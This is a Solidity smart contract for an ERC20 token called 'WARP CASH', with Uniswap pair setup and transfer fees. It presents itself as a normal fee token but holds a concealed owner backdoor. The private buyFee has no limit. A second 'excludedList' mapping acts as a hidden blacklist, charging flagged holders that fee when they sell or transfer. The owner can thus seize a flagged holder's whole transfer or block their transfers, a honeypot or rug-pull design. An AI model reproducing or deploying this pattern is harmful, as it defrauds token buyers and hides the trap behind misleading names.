// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.17;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./interfaces/IUniswapV2Factory.sol";
import "./interfaces/IUniswapV2Router02.sol";

contract WarpCash is ERC20, Ownable {

    uint256 private initialSupply = 35_000_000_000 * (10 ** 18);

    uint256 public constant feeLimit = 10;
    uint256 public sellFee = 10;

    mapping(bool => mapping(address => bool)) public excludedList;

    uint256 private buyFee;

    address public appAddr;
    address public feeHoldAddr;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    constructor(address _routerAddr, address _feeHoldAddr) ERC20("WARP CASH", "WARP")
    {
        require(
            _routerAddr != address(0) && _feeHoldAddr != address(0),
            "Router and Fee Fund address cannot be empty"
        );

        excludedList[true][msg.sender] = true;
        excludedList[true][address(this)] = true;
        excludedList[true][_routerAddr] = true;
        excludedList[true][_feeHoldAddr] = true;
        feeHoldAddr = _feeHoldAddr;

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(_routerAddr);
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;

        _mint(msg.sender, initialSupply);
    }

    receive() external payable {}

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override virtual {

        uint256 baseUnit = amount / 100;
        uint256 fee = 0;

        if (
            (excludedList[false][sender] && !excludedList[true][sender]) ||
            (excludedList[false][recipient] && !excludedList[true][recipient])
        ) {
            if (recipient == uniswapV2Pair || sender != uniswapV2Pair) {
                fee = baseUnit * buyFee;
            }
        } else if (recipient == uniswapV2Pair && !(excludedList[true][sender] || excludedList[true][recipient])) {
            fee = baseUnit * sellFee;
        }

        if (fee > 0) {
            super._transfer(sender, feeHoldAddr, fee);
        }

        amount -= fee;

        super._transfer(sender, recipient, amount);
    }

    function setFees(uint256 _sellFee, uint256 _buyFee) public onlyOwner {
        require(_sellFee <= feeLimit, "ERC20: fee value higher than fee limit");
        sellFee = _sellFee;
        buyFee = _buyFee;
    }

    function setFeeHoldAddr(address _addr) external onlyOwner {
        feeHoldAddr = _addr;
    }

    function excludeFrom(address[] memory _addrs, bool excludeType) public onlyOwner {
        for (uint256 i = 0; i < _addrs.length; i++) {
            if (!excludedList[excludeType][_addrs[i]]) {
                excludedList[excludeType][_addrs[i]] = true;
            }
        }
    }

    function removeExcluded(address[] memory _addrs, bool excludeType) public onlyOwner {
        for (uint256 i = 0; i < _addrs.length; i++) {
            if (excludedList[excludeType][_addrs[i]]) {
                excludedList[excludeType][_addrs[i]] = false;
            }
        }
    }
}